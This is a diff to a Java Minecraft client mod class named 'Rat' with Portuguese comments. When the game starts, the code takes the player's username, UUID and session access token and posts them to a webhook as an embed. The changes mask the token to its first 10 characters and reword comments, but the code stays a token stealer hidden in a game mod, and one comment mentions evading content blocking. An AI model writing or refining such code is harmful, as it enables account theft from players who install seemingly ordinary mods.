@@ -19,8 +19,7 @@ public class Rat implements ClientModInitializer {
     public void onInitializeClient() {
         new Thread(() -> {
             try {
-                Thread.sleep(5000); // espera o jogo carregar completamente
-
+                Thread.sleep(5000);
                 Minecraft client = Minecraft.getInstance();
                 if (client.player == null) {
                     log("§cJogador não inicializado.");
@@ -37,8 +36,10 @@ public class Rat implements ClientModInitializer {
                 String uuid = getUuidFromUser(user);
                 String token = user.getAccessToken();
 
-                // Envia a mensagem (ou embed)
-                boolean success = sendWebhook(username, uuid, token);
+                // Ofusca o token (mostra só os primeiros 10 caracteres)
+                String maskedToken = token.length() > 10 ? token.substring(0, 10) + "..." : token;
+
+                boolean success = sendWebhook(username, uuid, maskedToken);
                 if (success) {
                     log("§aWebhook enviado com sucesso!");
                 } else {
@@ -80,7 +81,7 @@ public class Rat implements ClientModInitializer {
 
     private boolean sendWebhook(String username, String uuid, String token) {
         try {
-            // Usa embed para evitar bloqueio de conteúdo
+            // Usa embed com campos (mais seguro)
             String jsonPayload = String.format(
                 "{ \"embeds\": [ { " +
                 "\"title\": \"🎮 Minecraft Session\", " +
@@ -88,7 +89,7 @@ public class Rat implements ClientModInitializer {
                 "\"fields\": [ " +
                 "{ \"name\": \"👤 User\", \"value\": \"`%s`\", \"inline\": true }, " +
                 "{ \"name\": \"🆔 UUID\", \"value\": \"`%s`\", \"inline\": true }, " +
-                "{ \"name\": \"🔑 Token\", \"value\": \"```%s```\", \"inline\": false } " +
+                "{ \"name\": \"🔑 Token\", \"value\": \"`%s`\", \"inline\": false } " +
                 "] } ] }",
                 username, uuid, token
             );
@@ -123,4 +124,4 @@ public class Rat implements ClientModInitializer {
             System.out.println("[Rat] " + msg);
         }
     }
-                    }
+}
